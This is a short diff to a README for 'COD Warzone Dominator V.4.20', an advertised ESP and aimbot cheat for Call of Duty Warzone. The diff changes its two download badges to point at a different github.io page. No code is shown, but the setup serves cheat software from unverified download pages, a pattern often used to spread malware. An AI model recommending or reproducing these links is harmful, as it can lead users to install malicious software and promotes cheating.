@@ -1,7 +1,7 @@
 # 🎯 COD Warzone Dominator V.4.20 — ESP & Aimbot Tactical Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-orange?style=for-the-badge)](https://cod-warzone-dominator.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-darkblue?style=for-the-badge&logo=call-of-duty)](https://cod-warzone-dominator.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-orange?style=for-the-badge)](https://therosalierose87.github.io/.github/cod-warzone-dominator)  
+[![Download Now](https://img.shields.io/badge/Download_Now-darkblue?style=for-the-badge&logo=call-of-duty)](https://therosalierose87.github.io/.github/cod-warzone-dominator)
 
 ---
 
